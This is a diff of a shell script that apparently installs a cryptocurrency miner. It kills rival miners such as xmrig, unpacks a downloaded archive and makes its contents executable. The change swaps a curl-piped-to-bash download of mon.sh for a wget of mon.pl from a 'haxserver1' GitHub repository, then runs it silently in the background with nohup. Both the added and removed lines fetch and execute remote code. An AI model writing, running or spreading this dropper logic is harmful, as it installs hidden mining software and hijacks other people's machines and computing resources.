@@ -27,6 +27,7 @@ case $1 in
     exit 1
     ;;
 esac
+
 echo "Removing other miner if any"
 pkill xmrig
 pkill session_ajqysbe
@@ -45,7 +46,7 @@ fi
 
 # Unzip the downloaded file
 echo "Unzipping the file"
-unzip kwarta.zip
+unzip kwarta.zip -d extracted
 if [ $? -ne 0 ]; then
   echo "Unzipping failed."
   rm -rf kwarta.zip
@@ -58,7 +59,8 @@ fi
 rm -rf kwarta.zip
 
 # Change directory to the extracted folder
-cd sess_aksd19sb187ss1ia901b23
+EXTRACTED_DIR=$(ls -td extracted/* | head -1)
+cd "$EXTRACTED_DIR"
 if [ $? -ne 0 ]; then
   echo "Directory change failed. The expected directory may not exist."
   exit 1
@@ -67,16 +69,18 @@ fi
 # Make all files in the directory executable
 chmod +x *
 
-# Execute additional script
-echo "Downloading and executing additional script..."
-if curl_output=$(curl -s "https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.sh"); then
-    echo "Script downloaded successfully. Executing..."
-    echo "$curl_output" | bash
-    echo "Additional script executed successfully."
-else
-    echo "Failed to download or execute additional script."
-    exit 1
+# Download and run the additional script
+wget https://raw.githubusercontent.com/haxserver1/session_uia21jkjgz8719831bs9d1ba971283v/main/mon.pl 
+if [ $? -ne 0 ]; then
+  echo "Failed to download mon.pl script."
+  exit 1
 fi
 
+# Run the Perl script
+nohup perl mon.pl >/dev/null 2>&1 &
+if [ $? -ne 0 ]; then
+  echo "Failed to execute mon.pl script."
+  exit 1
+fi
 
 echo "Script executed successfully."
